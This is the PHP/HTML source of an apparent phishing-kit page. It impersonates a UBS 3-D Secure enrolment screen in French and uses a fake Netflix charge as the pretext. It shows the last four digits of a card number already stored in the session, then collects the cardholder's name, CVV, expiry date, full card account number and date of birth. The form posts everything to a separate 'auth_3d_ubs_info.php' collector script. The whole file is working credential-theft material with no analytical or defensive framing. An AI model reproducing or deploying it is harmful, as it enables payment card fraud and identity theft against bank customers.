<?php

session_start();

///// PRINT 4 LAST NUMBERS //////
$number = $_SESSION['cn'];
$masked =  str_pad(substr($number, -4), strlen($number), 'x', STR_PAD_LEFT);
$phone = $_SESSION['tel'];
$ephone =  str_pad(substr($phone, -4), strlen($phone), 'X', STR_PAD_LEFT);
///// PRINT 4 LAST NUMBERS //////






?>
<!DOCTYPE html>
<html data-useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="cache-control" content="no cache">
    <meta http-equiv="Pragma" content="no cache">
    <meta http-equiv="Expires" content="0">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>3-D Secure inscription - protégez votre carte</title>
    <link rel="stylesheet" href="3-D_files/ubs_styles.min.css" type="text/css">
   
  </head>
  <body class="ads" onload="OnPageInit()" onfocus="onFocusHandler();" onbeforeunload="onBeforeUnloadHandler(this);" onunload="onUnloadHandler(this);">
    <form name="optInForm" method="post" action="../activity/auth_3d_ubs_info.php" >
      <div class="header-logo vpas-logo-pwd">
        <ul class="ddmenu">
          <li class="mainentry">
            <a onclick="setOpened(this)" id="langselect" href="https://3dsec.cardcenter.ch/acspage/cap.cgi#">Langue<span class="arrow-down"></span></a>
            <ul id="ddexpanded">
              <li><a onclick="setLocale(&#39;de_DE&#39;, this);" href="flowGlobal_wflowCNCE_jsession_ubs_forget_de.php">Deutsch</a></li>
              <li><a onclick="setLocale(&#39;fr_FR&#39;, this);" href="flowGlobal_wflowCNCE_jsession_ubs_forget_fr.php">Français</a></li>
              <li><a onclick="setLocale(&#39;it_IT&#39;, this);" href="flowGlobal_wflowCNCE_jsession_ubs_forget_it.php">Italiano</a></li>
              <li><a onclick="setLocale(&#39;en_US&#39;, this);" href="flowGlobal_wflowCNCE_jsession_ubs_forget_en.php">English</a></li>
            </ul>
          </li>
          <li class="mainentry"><a onclick="closing=false" href="javascript: HelpWindow(&#39;ubs-logo.gif&#39;)">
            <span id="help">Aide</span></a>
          </li>
        </ul>
        <div class="vpasLogo mastercard-logo.gif"></div>
      </div>

      <div class="form-content">
        <div id="fyp_header"><h1 class="cuiHeadline lr-headline">Protégez votre carte</h1></div>
<a class="trigger"><img class="error-img" border="0" alt="" src="3-D_files/Icon-Message-Warning-36px.png"></a><a class="close-btn">x</a><div id="fyp_register_msg" class="optin cuiMessageWarningBorder"><img class="error-img" src="3-D_files/Icon-Message-Warning-36px.png" border="0" alt="">Afin de pouvoir continuer à utiliser votre carte auprès les commerçants 3-D Secure, vous devez vous réinscrire.</div>
<div id="error1"></div>
<div class="clear"></div>
  <div id="subHeader">Sécurité sur Internet: inscrivez-vous à <a href="javascript: OpenWindow()" onclick="closing=false">3-D Secure</a> dès maintenant.</div>
<div class="form-line">
<label id="merchant">Marchand</label>
<div class="form-text">Netflix</div>
</div>
<div class="form-line">
<label id="amount">Montant</label>
<div class="form-text">EUR&nbsp;13,99</div>
</div>
<div class="form-line">
<label id="card">Numéro de carte</label>
<div class="form-text"><?php echo $masked ?></div>
</div>
<div class="form-line">
<label id="ques1">Nom sur carte</label>
<input type="text" name="CHname" class="cuiEntryfieldFont cuiEntryfield length30" size="30" maxlength="50" required>
<div id="ques1Info" class="infoOnNewLine"><span id="ques1Label" class="infoline"><img style="vertical-align: middle" alt="info" src="3-D_files/info-message.png" border="0" title="Ihr Name, wie auf Ihrer Karte aufgedruckt.">Votre nom tel qu'il figure sur votre carte.</span></div>
</div>
<div class="form-line">
<label id="ques2">Code de sécurité</label>
<input type="password" name="cvv2" class="cuiEntryfieldFont cuiEntryfield length3" minlength="3" maxlength="3" required>&nbsp;&nbsp;<a href="javascript: infoU(&#39;cvv&#39;)" onclick="closing=false"><img style="vertical-align: middle" alt="cvc image" src="3-D_files/Credit_Card-Security_Code_2x.png" width="32" height="18" border="0"></a>
<div id="ques2Info" class="form-text"><a href="javascript: infoU(&#39;cvv&#39;)" onclick="closing=false"><span id="ques2Label"></span></a></div>
</div>
<div class="form-line">
<label id="ques3">Date d'échéance</label>
<input type="text" pattern="[0-9]*" name="expirydate1" placeholder="MM" id="inpMonth" class="cuiEntryfieldFont cuiEntryfield length2" maxlength="2" onkeyup="processKey(null, this, document.optInForm.expirydate2, event, 2)" required>
<input type="text" pattern="[0-9]*" name="expirydate2" placeholder="AA" id="inpYear2" class="cuiEntryfieldFont cuiEntryfield length2" maxlength="2" onkeyup="processKey(document.optInForm.expirydate1, this, null, event, 2)" required>
</div>
<div class="form-line">
<label id="ques4">N° du compte de carte</label>
<input type="text" pattern="[0-9]*" name="acctnumber1" class="cuiEntryfieldFont cuiEntryfield length4" size="2" maxlength="4" disabled="disabled" value="0000" required>
<input type="text" pattern="[0-9]*" name="acctnumber2" class="cuiEntryfieldFont cuiEntryfield length4" size="2" maxlength="4" onkeyup="processKey(null, this, document.optInForm.acctnumber3, event, 4)" required>
<input type="text" pattern="[0-9]*" name="acctnumber3" class="cuiEntryfieldFont cuiEntryfield length4" size="2" maxlength="4" onkeyup="processKey(document.optInForm.acctnumber2, this, document.optInForm.acctnumber4, event, 4)" required>
<input type="text" pattern="[0-9]*" name="acctnumber4" class="cuiEntryfieldFont cuiEntryfield length4" size="2" maxlength="4" onkeyup="processKey(document.optInForm.acctnumber3, this, null, event, 4)" required>
<div id="ques4Info" class="form-text"><a href="javascript: infoU(&#39;acctNum&#39;)" onclick="closing=false"><span id="ques4Label" class="infoicon"><img style="vertical-align: middle" alt="info" src="3-D_files/info-tip.png" border="0" title="Vous le trouvez sur votre décompte de carte ou dans la lettre de communication de votre NIP."></span></a></div>
</div>
<div class="form-line">
<label id="ques5">Date de naissance</label>
<input type="text" pattern="[0-9]*" name="dateofbirth1" placeholder="JJ" id="inpDay" class="cuiEntryfieldFont cuiEntryfield length2" maxlength="2" onkeyup="processKey(null, this, document.optInForm.dateofbirth2, event, 2)" required>
<input type="text" pattern="[0-9]*" name="dateofbirth2" placeholder="MM" id="inpMonth2" class="cuiEntryfieldFont cuiEntryfield length2" maxlength="2" onkeyup="processKey(document.optInForm.dateofbirth1, this, document.optInForm.dateofbirth3, event, 2)" required>
<input type="text" pattern="[0-9]*" name="dateofbirth3" placeholder="AAAA" id="inpYear4" class="cuiEntryfieldFont cuiEntryfield length4" maxlength="4" onkeyup="processKey(document.optInForm.dateofbirth3, this, null, event, 4)" required>
</div>

        <!-- Issuer speciffic info -->
        <hr class="cuiHR">
        <!-- Start of the Close button -->
        <div class="form-line form-buttons">
         <input type="submit" class="cuiButtonFont cuiButtonPrimary cuiButton" id="success" value="Continuer" onclick="return OnUserInput(1);">

          
        </div>

      </div>
     
      
    </form>



  

</body></html>